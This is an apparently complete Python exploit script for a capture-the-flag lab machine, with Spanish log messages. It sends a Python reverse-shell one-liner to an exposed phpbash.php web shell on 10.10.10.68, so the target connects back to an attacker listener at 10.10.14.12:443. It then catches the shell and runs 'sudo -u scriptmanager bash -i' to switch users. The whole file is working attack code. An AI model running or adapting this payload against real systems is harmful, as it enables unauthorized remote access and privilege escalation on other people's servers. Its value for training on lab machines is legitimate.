#!/usr/bin/python3
#coding: utf-8

import sys
import signal
import requests
import threading
import time

from pwn import *

# Variables globales
main_url = "http://10.10.10.68/dev/phpbash.php"
s = requests.Session()
lport = 443


def handler(sig,frame):
    log.failure("Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT,handler)


def makeRequest():
    post_data = {
        'cmd' : """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
    }
    r = s.post(main_url,data=post_data)
    
    p1.status("Esperando conexion por parte de la máquina víctima...")
    time.sleep(1)


if __name__ == "__main__":
    try:
        p1 = log.progress("Reverse shell")
        threading.Thread(target=makeRequest).start()
    except:
        log.failure("Error obteniendo la shell")
        time.sleep(1)
        sys.exit(1)
    
    shell = listen(lport, timeout=20).wait_for_connection()
    
    if shell.sock is None:
        log.failure("Error obteniendo la conexión")
        time.sleep(1)
        sys.exit(1)
    else:
        p1.success("Shell obtenida")
        time.sleep(1)
        shell.sendline(b"sudo -u scriptmanager bash -i")
        shell.interactive()